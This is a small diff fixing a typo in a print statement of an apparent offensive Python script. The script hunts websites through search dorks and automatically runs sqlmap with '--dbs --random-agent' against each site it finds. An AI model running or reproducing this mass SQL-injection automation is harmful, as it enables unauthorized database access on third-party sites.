@@ -129,7 +129,7 @@ if at == "DS" :
     time.sleep(4.0)
     print(Fore.GREEN+"HUNTING... PLEASE WAIT!")
     print(Fore.RED +"[:] DORK INSERTED: " + dork, '\n' + "[!] WEBSITE FOUND: " + i)
-    print(FOre.RED + "========================================")
+    print(Fore.RED + "========================================")
     time.sleep(10.0)
     call(["sqlmap", i ,"--dbs", "--random-agent"])
 
